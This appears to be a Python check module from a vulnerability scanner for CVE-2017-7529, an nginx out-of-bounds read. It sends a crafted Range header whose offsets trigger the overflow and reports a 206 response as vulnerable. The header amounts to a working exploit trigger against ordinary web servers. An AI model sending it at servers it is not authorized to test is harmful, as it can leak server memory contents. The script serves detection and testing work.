#!/usr/bin/python3

'''
name: CVE-2017-7529漏洞
description: CVE-2017-7529越界读取信息漏洞
'''

from app.lib.utils.request import request

class CVE_2017_7529_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
        }
        
    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.get(self.url, headers = self.headers)
            start = len(check_req.content) + 605
            end = 0x8000000000000000 - start
            self.headers["Range"] = "bytes=-{},-{}".format(start, end)
            cmd_req = request.get(self.url, headers = self.headers )
            if cmd_req.status_code == 206:
                #print(cmd_req.text)
                print("存在CVE-2017-752漏洞")
                return True
            else:
                print("不存在CVE-2017-752漏洞")
                return False
        except Exception as e:
            print(e)
            return False

if  __name__ == "__main__":
    CVE_2017_7529 = CVE_2017_7529_BaseVerify('http://10.3.3.225/')
    CVE_2017_7529.run()